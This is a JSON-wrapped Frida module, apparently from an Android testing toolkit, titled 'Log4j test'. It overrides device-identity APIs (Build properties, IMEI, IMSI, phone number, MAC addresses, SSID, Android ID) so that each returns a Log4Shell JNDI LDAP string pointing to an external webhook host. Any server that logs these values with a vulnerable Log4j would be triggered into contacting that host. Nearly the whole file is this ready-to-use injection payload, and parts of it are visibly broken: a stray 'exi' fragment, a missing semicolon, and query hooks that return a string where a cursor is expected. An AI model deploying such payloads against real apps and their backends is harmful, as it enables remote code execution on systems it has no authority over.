{
    "Name": "exploits/log4j",
    "Description": "Log4j test",
    "Help": "Modifies Device Recon characteristics by replaceing them with a log4j payl0ad",
    "Code": "
console.log('\\n-----Device Cloaking module by Ch0pin-----------------');


var networkInterface = Java.use('java.net.NetworkInterface');
var secureSettings = Java.use('android.provider.Settings$Secure');
var contentResolver = Java.use('android.content.ContentResolver');
var wifiInfo = Java.use('android.net.wifi.WifiInfo');
var bluetoothAdapter = Java.use('android.bluetooth.BluetoothAdapter');
var mediaDrm = Java.use('android.media.MediaDrm');
var telephonyManager = Java.use('android.telephony.TelephonyManager');
var build = Java.use('android.os.Build');
var systemProperties = Java.use('android.os.SystemProperties');
var buildProperties = Java.use('android.os.Build');

//-----------------------------------------------
buildProperties.MODEL.value=\"${jndi:ldap://api.webhookinbox.com:80/i/uxQPLS1L/in/\";exi
buildProperties.DEVICE.value=\"${jndi:ldap://api.webhookinbox.com:80/i/uxQPLS1L/in/\";
buildProperties.BOARD.value=\"${jndi:ldap://api.webhookinbox.com:80/i/uxQPLS1L/in/\";
buildProperties.PRODUCT.value=\"${jndi:ldap://api.webhookinbox.com:80/i/uxQPLS1L/in/\";
buildProperties.HARDWARE.value=\"${jndi:ldap://api.webhookinbox.com:80/i/uxQPLS1L/in/\";
buildProperties.FINGERPRINT.value=\"${jndi:ldap://api.webhookinbox.com:80/i/uxQPLS1L/in/\"
buildProperties.MANUFACTURER.value=\"${jndi:ldap://api.webhookinbox.com:80/i/uxQPLS1L/in/\";
buildProperties.BOOTLOADER.value=\"${jndi:ldap://api.webhookinbox.com:80/i/uxQPLS1L/in/\";
buildProperties.BRAND.value=\"${jndi:ldap://api.webhookinbox.com:80/i/uxQPLS1L/in/\";
buildProperties.HOST.value=\"${jndi:ldap://api.webhookinbox.com:80/i/uxQPLS1L/in/\";
buildProperties.ID.value=\"${jndi:ldap://api.webhookinbox.com:80/i/uxQPLS1L/in/\";
buildProperties.DISPLAY.value=\"${jndi:ldap://api.webhookinbox.com:80/i/uxQPLS1L/in/\";
buildProperties.TAGS.value=\"${jndi:ldap://api.webhookinbox.com:80/i/uxQPLS1L/in/\";
buildProperties.SERIAL.value=\"${jndi:ldap://api.webhookinbox.com:80/i/uxQPLS1L/in/\";
buildProperties.TYPE.value=\"${jndi:ldap://api.webhookinbox.com:80/i/uxQPLS1L/in/\";
buildProperties.USER.value=\"${jndi:ldap://api.webhookinbox.com:80/i/uxQPLS1L/in/\";
buildProperties.UNKNOWN.value=\"${jndi:ldap://api.webhookinbox.com:80/i/uxQPLS1L/in/\";

//-----------------------------------------------

var payl0ad = \"${jndi:ldap://api.webhookinbox.com:80/i/uxQPLS1L/in/\"

console.log(\"[+] Payl0ad: \"+payl0ad);

systemProperties.get.overload('java.lang.String').implementation = function(key){
    console.log('[+] Get system properties called using key: ' + key + ', returning '+payl0ad);
    return payl0ad;
    
}

build.getSerial.implementation = function(){
    colorLog('[+] Application is fetching the OS serial, returning ' + payl0ad,{c: Color.Green});
    return payl0ad;
}

telephonyManager.getLine1Number.overloads[0].implementation = function() {
    colorLog('[+] Application is fetching the phone number, returning '+payl0ad,{c: Color.Green});
    return payl0ad;
}

telephonyManager.getSubscriberId.overload().implementation = function(){
    console.log('[i] Application asks for device IMSI, returning:'+payl0ad);
    return payl0ad;
}
telephonyManager.getSubscriberId.overload('int').implementation = function(){
    console.log('[i] Application asks for device IMSI, returning ' + payl0ad);
    return payl0ad;
}

telephonyManager.getDeviceId.overloads[0].implementation = function(){
    console.log('[i] Application asks for device IMEI, returning'+payl0ad);
    return payl0ad;
}
telephonyManager.getDeviceId.overloads[1].implementation = function(slot){
    console.log('[i] Application asks for device IMEI, returning:'+payl0ad);
    return payl0ad;
}

telephonyManager.getImei.overloads[0].implementation = function(){
    console.log('[i] Application asks for device IMEI, returning :'+payl0ad);
    return payl0ad;
}
telephonyManager.getImei.overloads[1].implementation = function(slot){
    console.log('[i] Application asks for device IMEI, returning: '+payl0ad);
    return  payl0ad;
}

telephonyManager.getSimOperator.overload().implementation = function(){
    console.log('[+] getSimOperator call detected, returning:'+payl0ad);
    return payl0ad;
}
telephonyManager.getSimOperator.overload('int').implementation = function(sm){
    console.log('[+] getSimOperator call detected, returning:'+payl0ad);
    return payl0ad;
}







bluetoothAdapter.getAddress.implementation = function(){
    console.log(\"[+] Cloaking BT Mac Address, returning:\"+payl0ad);
    return payl0ad;
}


wifiInfo.getMacAddress.implementation = function(){
    console.log(\"[+] Cloaking wifi Mac Address, returning:\"+payl0ad);
    return payl0ad;

}
wifiInfo.getSSID.implementation = function(){
    console.log(\"[+] Cloaking SSID, returning:\"+payl0ad);
    return payl0ad;

}
wifiInfo.getBSSID.implementation = function(){
    console.log(\"[+] Cloaking Router Mac Address, returning:\"+payl0ad);
    return payl0ad;

}


contentResolver.query.overload('android.net.Uri', '[Ljava.lang.String;', 'android.os.Bundle', 'android.os.CancellationSignal').implementation = function(uri,str,bundle,sig){
    if(uri == 'content://com.google.android.gsf.gservicesa')
    {
        console.log('[+] Cloaking Google Services Framework Identifier Query, returning null');
        return null;
    }
    else 
        return payl0ad;


}

contentResolver.query.overload('android.net.Uri', '[Ljava.lang.String;', 'java.lang.String', '[Ljava.lang.String;', 'java.lang.String').implementation = function(uri,astr,bstr,cstr,dstr){
    if(uri == 'content://com.google.android.gsf.gservicesa')
    {
        console.log('[+] Cloaking Google Services Framework Identifier Query, returning null');
        return null;
    }
    else
        return getApplicationContext.getContentResolver.query(uri,astr,bstr,cstr,dstr);

}

contentResolver.query.overload('android.net.Uri', '[Ljava.lang.String;', 'java.lang.String', '[Ljava.lang.String;', 'java.lang.String', 'android.os.CancellationSignal').implementation = function(uri,astr,bstr,cstr,sig){
    if(uri == 'content://com.google.android.gsf.gservicesa')
    {
        console.log('[+] Cloaking Google Services Framework Identifier Query, returning null');
        return null;
    }
    else 
        return payl0ad;

}

secureSettings.getString.implementation = function(contentresolver, query){
    console.log('[+] Cloaking Android ID, returning dummy value:'+payl0ad);
    if (query == 'android_id')
        return payl0ad;
    else
        return this.getString(contentresolver,query);
}
"
}
